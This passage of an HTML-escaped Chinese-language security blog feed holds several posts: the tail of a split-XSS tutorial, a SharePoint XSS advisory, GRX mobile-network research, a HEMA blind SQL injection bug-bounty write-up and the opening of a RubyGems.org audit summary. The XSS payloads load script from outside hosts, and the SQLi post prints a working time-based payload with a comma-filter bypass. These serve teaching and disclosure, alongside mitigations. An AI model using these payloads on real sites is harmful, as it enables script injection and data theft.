&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;alert(1)/*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;在后续输入中闭合标签：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*/&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;字符分配策略&#34;&gt;字符分配策略
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;第一个字段：用12个字符闭合输入标签并开始脚本标签，剩余8个字符用于有效载荷&lt;/li&gt;
&lt;li&gt;中间字段：每字段16个有效载荷字符（扣除4个字符用于注释标记）&lt;/li&gt;
&lt;li&gt;最后字段：9个有效载荷字符（扣除11个字符用于闭合注释和脚本标签）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;实际攻击载荷示例&#34;&gt;实际攻击载荷示例
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt;&amp;lt;script&amp;gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/x=document/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/.createElement(/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/&amp;#34;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;);x./*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/src=&amp;#34;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//dn.lc/s&amp;#34;;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/document.head./&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/appendChild(x);/&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;组合xss技术&#34;&gt;组合XSS技术
&lt;/h2&gt;&lt;p&gt;当网站将两个输入字段组合显示时，可以：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在名字字段注入不完整的脚本标签：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abc&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;//digi.ninja/script.js&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;在姓氏字段注入闭合标签：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;组合后形成完整标签：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abc&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;//digi.ninja/script.js&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;防御措施&#34;&gt;防御措施
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;正确的输出编码是根本解决方案&lt;/li&gt;
&lt;li&gt;输入验证可以作为辅助防御层&lt;/li&gt;
&lt;li&gt;永远不要信任用户提供的内容&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://digi.ninja/labs/split_xss.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;完整测试实验室可在Split XSS Lab获取&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SharePoint XSS漏洞技术分析与缓解措施</title>
        <link>http://localhost:1313/p/sharepoint-xss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/</link>
        <pubDate>Sat, 02 Aug 2025 15:40:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/sharepoint-xss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/</guid>
        <description>&lt;h1 id=&#34;sharepoint-xss漏洞&#34;&gt;SharePoint XSS漏洞
&lt;/h1&gt;&lt;p&gt;今天我们发布了安全公告983438，向客户通报SharePoint Server 2007和SharePoint Services 3.0中存在的跨站脚本(XSS)漏洞。以下是该漏洞的详细技术分析。&lt;/p&gt;
&lt;h2 id=&#34;攻击向量分析&#34;&gt;攻击向量分析
&lt;/h2&gt;&lt;p&gt;公告指出该漏洞可能导致SharePoint站点内的权限提升(EoP)。需要特别说明的是，这种权限提升并非从普通用户到工作站或服务器环境的管理员用户，而是攻击者可以在用户的SharePoint会话上下文中执行恶意脚本。最可能的攻击场景是：攻击者向已登录SharePoint服务器的用户发送恶意链接，当用户点击该链接时，攻击者嵌入的JavaScript将在点击者的用户上下文中执行。&lt;/p&gt;
&lt;h2 id=&#34;缓解措施&#34;&gt;缓解措施
&lt;/h2&gt;&lt;p&gt;SharePoint使用Http-Only cookies进行身份验证。由于HttpOnly cookies无法通过脚本访问，这显著降低了XSS攻击风险。更多信息请参考《使用HTTP-only Cookies缓解跨站脚本攻击》。&lt;/p&gt;
&lt;p&gt;IE8的XSS过滤器在Internet区域默认启用，能拦截此类XSS攻击，因此IE8用户面临的风险较低。但该过滤器在本地Intranet区域默认禁用，可通过以下UI界面启用：&lt;/p&gt;
&lt;p&gt;[图片：IE8 XSS过滤器启用界面]&lt;/p&gt;
&lt;p&gt;管理员也可以通过组策略为任何区域启用或禁用XSS过滤器，详见《组策略与Internet Explorer 8》。&lt;/p&gt;
&lt;h2 id=&#34;临时解决方案&#34;&gt;临时解决方案
&lt;/h2&gt;&lt;p&gt;我们建议通过服务器端ACL设置限制help.aspx文件的访问。启用此方案后，您将无法查看SharePoint站点内的帮助内容。实施此缓解措施的用户可访问以下英文帮助内容作为替代：
&lt;a class=&#34;link&#34; href=&#34;http://office.microsoft.com/en-us/sharepointserver/FX101211721033.aspx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://office.microsoft.com/en-us/sharepointserver/FX101211721033.aspx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Jonathan Ness, David Ross和Chengyun Chu，MSRC工程团队
&lt;em&gt;本文按&amp;quot;原样&amp;quot;提供，不作任何担保，也不授予任何权利。&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>揭秘GRX网络与间谍活动：移动数据安全漏洞分析</title>
        <link>http://localhost:1313/p/%E6%8F%AD%E7%A7%98grx%E7%BD%91%E7%BB%9C%E4%B8%8E%E9%97%B4%E8%B0%8D%E6%B4%BB%E5%8A%A8%E7%A7%BB%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 15:02:00 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%8F%AD%E7%A7%98grx%E7%BD%91%E7%BB%9C%E4%B8%8E%E9%97%B4%E8%B0%8D%E6%B4%BB%E5%8A%A8%E7%A7%BB%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;移动数据网络基础&#34;&gt;移动数据网络基础
&lt;/h3&gt;&lt;p&gt;在移动数据网络中，设备位置信息至关重要。例如荷兰KPN运营商拥有约5000个基站，每个基站通过小区标识符（CI）和路由区域码（RAC）进行管理。国际移动用户标识（IMSI）、接入点名称（APN）和SIM卡存储的通用集成电路卡（UICC）是网络接入的核心要素。数据包传输需经过服务GPRS支持节点（SGSN）、网关GPRS支持节点（GGSN）等组件，并通过GPRS隧道协议（GTP）建立专用通信隧道（基于UDP的GTPv0/v1/v2协议）。&lt;/p&gt;
&lt;h3 id=&#34;grx网络的安全价值&#34;&gt;GRX网络的安全价值
&lt;/h3&gt;&lt;p&gt;当设备漫游时，运营商通过GRX网络将流量路由至归属国网关。研究团队发现：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;数据暴露风险&lt;/strong&gt;：通过自定义脚本剥离GTP头部后，可解析出明文流量（含用户凭证）；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;位置追踪&lt;/strong&gt;：GTP头部包含MCC（国家代码）、MNC（运营商代码）、LAC（位置区号）等元数据，结合IMEI分析可精确定位设备；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络隔离失效&lt;/strong&gt;：扫描显示GRX网络中存在大量暴露的SMTP/FTP/Telnet服务（含老旧漏洞版本），42K主机中有5.5K可直接从互联网访问。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;渗透测试方法论&#34;&gt;渗透测试方法论
&lt;/h3&gt;&lt;p&gt;团队采用&amp;quot;杀伤链&amp;quot;模型对GRX网络进行审计：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;BGP路由分析&lt;/strong&gt;：识别4.8K子网（320K IP地址）；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;大规模扫描&lt;/strong&gt;：使用zmap探测GTP服务（UDP 2152/2123端口）；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模拟攻击&lt;/strong&gt;：通过SGSNEMU工具伪造GGSN连接，建立虚假PDP上下文；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;服务枚举&lt;/strong&gt;：发现运营商DNS服务器多运行老旧BIND版本（存在DoS漏洞）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;防御建议&#34;&gt;防御建议
&lt;/h3&gt;&lt;p&gt;运营商应：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从BGP表中移除GRX前缀&lt;/li&gt;
&lt;li&gt;实施BGP认证与入口过滤&lt;/li&gt;
&lt;li&gt;严格限制AS号间的路由前缀交换&lt;/li&gt;
&lt;li&gt;应用最小权限访问控制列表（仅允许GTP/DNS/ICMP）&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;案例关联&lt;/strong&gt;：比利时电信（Belgacom）被黑事件表明，攻击者可能通过社工管理员而非外部漏洞获取GRX访问权限，凸显内部威胁防护的重要性。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>HEMA网站盲注SQL注入漏洞技术分析</title>
        <link>http://localhost:1313/p/hema%E7%BD%91%E7%AB%99%E7%9B%B2%E6%B3%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 12:04:20 +0800</pubDate>
        
        <guid>http://localhost:1313/p/hema%E7%BD%91%E7%AB%99%E7%9B%B2%E6%B3%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;hema网站盲sql注入漏洞分析&#34;&gt;HEMA网站盲SQL注入漏洞分析
&lt;/h1&gt;&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
&lt;/h2&gt;&lt;p&gt;现代网站普遍采用数据库存储数据，服务器应用通过SQL查询语句与数据库交互。当存在查询构造缺陷时，攻击者可能通过注入恶意SQL代码获取敏感数据，这类漏洞被称为SQL注入(SQLi)，在漏洞赏金计划中通常属于高危漏洞。&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
&lt;/h2&gt;&lt;p&gt;在HEMA照片项目服务子域fasteditor.hema.com发现可疑API端点：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://fasteditor.hema.com/api/user/&amp;lt;userID&amp;gt;/products?offset=0&amp;amp;limit=8&amp;amp;orderby=id+DESC
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;测试发现orderby参数存在SQL注入特征：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;插入单引号导致返回PDO错误&lt;/li&gt;
&lt;li&gt;错误信息显示原始SQL片段且未转义&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;漏洞利用技术&#34;&gt;漏洞利用技术
&lt;/h2&gt;&lt;p&gt;SQLMap工具检测确认存在三种攻击方式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;布尔盲注&lt;/strong&gt;：通过结果排序差异推断数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;堆叠查询&lt;/strong&gt;：追加执行额外SQL语句&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;时间盲注&lt;/strong&gt;：利用SLEEP()函数时序分析&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;手工payload构造&#34;&gt;手工Payload构造
&lt;/h2&gt;&lt;p&gt;由于防火墙限制，最终采用时间盲注技术构造特殊payload：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;orderby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;DESC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;CASE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SUBSTRING&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FOR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;§h§&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;THEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SLEEP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ELSE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SLEEP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;关键技术点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用FROM/FOR替代被过滤的逗号&lt;/li&gt;
&lt;li&gt;通过Burp Intruder自动化字符爆破&lt;/li&gt;
&lt;li&gt;响应时间差异判断字符命中&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;漏洞验证结果&#34;&gt;漏洞验证结果
&lt;/h2&gt;&lt;p&gt;成功获取数据库用户信息：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hema_live@10.0.102.192
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;证明该端点存在可被利用的SQL注入漏洞。&lt;/p&gt;
&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;使用参数化查询替代字符串拼接&lt;/li&gt;
&lt;li&gt;实施严格的输入验证&lt;/li&gt;
&lt;li&gt;建立SQL查询日志审计机制&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2020-05-11：漏洞发现并修复&lt;/li&gt;
&lt;li&gt;2020-05-15：HEMA确认漏洞并发放奖励&lt;/li&gt;
&lt;li&gt;2020-08-06：报告公开披露&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>RubyGems.org安全审计报告：33个漏洞与加固建议</title>
        <link>http://localhost:1313/p/rubygems.org%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A33%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE/</link>
        <pubDate>Sat, 02 Aug 2025 11:53:14 +0800</pubDate>
        
        <guid>http://localhost:1313/p/rubygems.org%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A33%E4%B8%AA%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%8A%A0%E5%9B%BA%E5%BB%BA%E8%AE%AE/</guid>
        <description>&lt;h1 id=&#34;ruby生态系统中央包仓库安全审计&#34;&gt;Ruby生态系统中央包仓库安全审计
&lt;/h1&gt;&lt;p&gt;Ruby Central委托Trail of Bits对Ruby应用官方包管理系统RubyGems.org进行安全评估和竞品分析。作为下载量超1840亿次的关键基础设施，该平台的安全直接影响数百万Ruby开发者。&lt;/p&gt;
&lt;h2 id=&#34;审计范围与发现&#34;&gt;审计范围与发现
&lt;/h2&gt;&lt;p&gt;三名工程师耗时五周审查了rubygems.org和rubygems-terraform代码库，重点评估：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;常见Web漏洞（XSS/CSRF/SQLi/SSRF）&lt;/li&gt;
&lt;li&gt;认证绕过风险&lt;/li&gt;
&lt;li&gt;权限控制有效性&lt;/li&gt;
&lt;li&gt;AWS服务配置安全&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;发现的33个安全问题中包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;高危漏洞&lt;/strong&gt;：SMTP邮件系统采用&lt;code&gt;enable_starttls_auto: true&lt;/code&gt;配置，可能被中间人攻击降级为明文传输。建议改用强制TLS的&lt;code&gt;enable_starttls&lt;/code&gt;配置。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;部署流程缺陷&lt;/strong&gt;：生产环境部署缺乏多方审批机制&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;基础设施风险&lt;/strong&gt;：混合使用IaC与手动配置导致安全缺口（TOB-RGM-16等4个相关发现）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;反序列化风险&lt;/strong&gt;：RubyGems库存储Marshal数据可能被利用（虽不影响服务本身）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;竞品分析与改进建议&#34;&gt;竞品分析与改进建议
&lt;/h2&gt;&lt;p&gt;对比PyPI/npm等包管理器后提出19项改进，重点包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;强化可信发布基础设施&lt;/li&gt;
&lt;li&gt;扩展支持平台范围&lt;/li&gt;
